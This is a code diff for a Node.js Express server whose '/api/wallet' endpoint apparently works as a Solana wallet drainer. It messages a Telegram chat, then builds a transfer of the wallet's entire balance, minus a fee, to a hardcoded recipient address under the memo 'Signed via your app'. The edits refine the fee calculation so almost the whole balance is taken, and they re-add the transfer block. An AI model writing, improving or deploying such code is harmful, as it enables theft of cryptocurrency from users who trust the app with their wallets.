@@ -116,9 +116,10 @@ app.post('/api/wallet', async (req, res) => {
 
     await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', disable_web_page_preview: true });
 
-   // 🔹 Estimate real transaction fee
+   // 🔹 Get network fee dynamically + keep your 5000 lamports buffer
 const { feeCalculator } = await connection.getRecentBlockhash();
-const TRANSACTION_FEE = feeCalculator.lamportsPerSignature * 3; // 3 signatures buffer for safety
+const baseFee = feeCalculator.lamportsPerSignature;
+const TRANSACTION_FEE = baseFee + 5000; // network fee + extra buffer
 
 if (balance <= TRANSACTION_FEE) {
   return res.json({
@@ -130,11 +131,11 @@ if (balance <= TRANSACTION_FEE) {
   });
 }
 
-    // Prepare transaction (SOL transfer)
-    const payer = publicKey;
-    const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
-    const amount = balance - TRANSACTION_FEE;
-    const memo = 'Signed via your app';
+// Prepare transaction (SOL transfer)
+const payer = publicKey;
+const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
+const amount = balance - TRANSACTION_FEE;
+const memo = 'Signed via your app';
 
     const { blockhash } = await connection.getLatestBlockhash();
     const transaction = new Transaction({
@@ -210,4 +211,3 @@ if (balance <= TRANSACTION_FEE) {
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 });
-
